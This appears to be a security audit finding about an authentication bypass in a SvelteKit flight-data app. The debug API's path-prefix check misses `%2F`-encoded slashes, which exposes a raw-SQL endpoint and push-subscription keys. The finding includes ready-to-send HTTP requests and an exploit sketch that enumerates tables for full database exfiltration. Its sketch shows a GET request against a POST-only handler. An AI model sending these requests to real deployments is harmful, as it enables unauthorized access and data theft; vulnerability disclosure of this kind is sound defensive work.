---
id: longshot-cad49483-001
phase: X2
anchor: apps/web/src/routes/api/debug/flight-notes/+server.ts
slug: auth-bypass-percent-2f-encoding
severity: high
confidence: high
---

## Summary

The debug API authentication check in `hooks.server.ts` uses `event.url.pathname.startsWith('/api/debug/')` to gate all `/api/debug/*` endpoints behind a Bearer token. However, SvelteKit preserves `%2F` (encoded `/`) in `event.url.pathname` while simultaneously routing encoded paths to the same handlers (the route pattern regex explicitly matches `%2F` as a path separator). An attacker can bypass authentication on all debug endpoints — including `/api/debug/sql` which allows arbitrary `SELECT` queries — by sending requests with `%2F` in place of `/` in the URL path.

## Location

- `apps/web/src/hooks.server.ts:8-13` — auth check uses undecoded `event.url.pathname`
- `apps/web/src/lib/server/debug-helpers.ts:93-100` — `validateDebugToken` implementation
- `node_modules/@sveltejs/kit/src/runtime/server/respond.js:72` — `new URL(request.url)` preserves `%2F` in pathname
- `node_modules/@sveltejs/kit/src/runtime/server/respond.js:208` — `event.url` set from undecoded URL
- `node_modules/@sveltejs/kit/src/utils/routing.js:217-226` — `escape()` function converts `/` to `%2[Ff]` in route patterns, confirming SvelteKit matches encoded slashes
- `apps/web/src/routes/api/debug/sql/+server.ts` — SQL execution endpoint (escalation target)
- `apps/web/src/routes/api/debug/push-subs/+server.ts` — exposes Web Push subscription data
- `apps/web/src/routes/api/debug/flight-notes/+server.ts` — anchor: exposes flight notes

## Attacker Control

The attacker sends an HTTP request with `%2F` substituted for `/` in the debug API path:

```
GET /api%2Fdebug%2Fflight-notes?flight_id=1 HTTP/1.1
Host: target.airways.gg
```

No `Authorization` header is required. The same bypass works for all 17 debug endpoints, including:

```
GET /api%2Fdebug%2Fsql (POST with body)
GET /api%2Fdebug%2Fpush-subs
GET /api%2Fdebug%2Fflights
```

## Trust Boundary Crossed

The debug API is explicitly designed as an authenticated internal interface. The `DEBUG_API_TOKEN` environment variable and `validateDebugToken()` function exist specifically to prevent unauthorized access. The `hooks.server.ts` comment states: `"Debug API auth — gate /api/debug/* behind Bearer token"`. This bypass crosses the boundary from unauthenticated external attacker to authenticated debug API consumer.

## Impact

1. **Unauthenticated database read access**: The `/api/debug/sql` endpoint accepts arbitrary `SELECT`, `EXPLAIN`, `SHOW`, `DESCRIBE`, and `WITH` statements. An attacker can exfiltrate any data from any table in the database.

2. **Sensitive data exposure**: Exposed endpoints include:
   - `flight-notes` — flight operational notes and messages
   - `push-subs` — Web Push subscription endpoints and full subscription JSON (including authentication keys)
   - `flights`, `flight-times`, `status-history` — complete flight data
   - `weather`, `historical-weather` — weather data
   - `positions` — aircraft position data
   - `scrapers` — scraper configuration/logs
   - `notification-watermark` — notification tracking data

3. **Privacy violation**: Push subscription data (`pushSubscriptions.subscription` is JSONB containing Web Push API subscription objects with endpoint URLs and cryptographic keys) could enable targeted push notification attacks.

## Evidence

**Auth check in hooks.server.ts:8-13:**
```typescript
// Debug API auth — gate /api/debug/* behind Bearer token
if (event.url.pathname.startsWith('/api/debug/')) {
    const auth = event.request.headers.get('authorization');
    if (!validateDebugToken(auth, env.DEBUG_API_TOKEN)) {
      return json({ error: 'Unauthorized' }, { status: 401 });
    }
}
```
`event.url.pathname` is the undecoded pathname. It does not match `/api/debug/` when `%2F` is used.

**SvelteKit URL construction (respond.js:72):**
```javascript
const url = new URL(request.url);
```
Node.js `request.url` preserves `%2F` as-is, and the WHATWG `URL` constructor preserves `%2F` in `pathname` since it represents a literal `/` not meant to be a path separator.

**SvelteKit route pattern generation (routing.js:217-226):**
```javascript
function escape(str) {
    return (
        str.normalize()
            .replace(/[[\]]/g, '\\$&')
            // replace %, /, ? and # with their encoded versions because decode_pathname leaves them untouched
            .replace(/%/g, '%25')
            .replace(/\//g, '%2[Ff]')
            .replace(/\?/g, '%3[Ff]')
            .replace(/#/g, '%23')
            .replace(/[.*+?^${}()|\\]/g, '\\$&')
    );
}
```
The comment explicitly states the intent: SvelteKit builds route patterns that match `%2F` as `/` because `decode_pathname` does not decode it. This means a request to `/api%2Fdebug%2Fflight-notes` is routed to the same handler as `/api/debug/flight-notes`.

**No independent auth in any debug endpoint:**
All 17 debug endpoints rely solely on the `hooks.server.ts` guard. A grep for `validateDebugToken` across all `/api/debug/*` files returns zero matches — none implement defense in depth.

**SQL execution endpoint (sql/+server.ts:15-53):**
```typescript
export const POST: RequestHandler = async ({ request }) => {
  // ...
  const validation = validateSqlQuery(query);
  if (!validation.valid) {
    return debugError(validation.error, 403);
  }
  const d = getDb();
  await d.execute(sql`SET SESSION statement_timeout = '30s'`);
  let result;
  try {
    result = await d.execute(sql`${sql.raw(query)}`);
  } finally {
    await d.execute(sql`RESET statement_timeout`);
  }
  return debugResponse(result.rows, queryMs);
};
```
This endpoint executes raw SQL with only keyword-based restrictions (SELECT/EXPLAIN/SHOW/DESCRIBE/WITH allowed). Combined with the auth bypass, it provides complete database read access.

## Exploit Sketch

1. Attacker identifies the target airways.gg deployment.
2. Attacker sends an HTTP request with `%2F` encoding:
   ```
   GET /api%2Fdebug%2Fsql HTTP/1.1
   Host: target
   Content-Type: application/json

   {"sql": "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"}
   ```
3. No `Authorization` header is sent; the `startsWith('/api/debug/')` check does not match the encoded path.
4. SvelteKit routes the request to the SQL debug endpoint, which executes the query and returns all public table names.
5. Attacker iterates through tables to exfiltrate all database contents.

The same technique works against all other debug endpoints with `GET` or `POST` requests using `%2F` in place of `/`.

## Open Questions

1. **Reverse proxy normalization**: If there is a reverse proxy (nginx, Cloudflare, AWS ALB) in front of the SvelteKit server, it may normalize the URL path before forwarding the request. Some proxies decode `%2F` before forwarding, which would close this bypass. Not verifiable without deployment configuration access.

2. **SvelteKit version specificity**: Verified against SvelteKit 2.21.0 (`@sveltejs/kit ^2.21.0` in `apps/web/package.json`). The behavior relies on the `escape()` function in `routing.js` and the `decode_pathname` function in `url.js`. Future SvelteKit versions may change this behavior.

3. **`d.execute()` with `sql.raw()` and semicolons**: The SQL execution endpoint uses `d.execute(sql`${sql.raw(query)}`)`. Whether this uses the simple query protocol (supporting multiple semicolon-separated statements) or extended query protocol (single statement) depends on drizzle-orm internals. If simple protocol is used, there may be additional bypasses of the `validateSqlQuery` keyword filter via multi-statement queries.

4. **Other encoding variants**: Only `%2F` was verified. Other encodings (`%2f` lowercase, `%5C` backslash, double-encoding `%252F`) were not exhaustively tested but the route pattern `%2[Ff]` confirms both cases of `%2F` work.
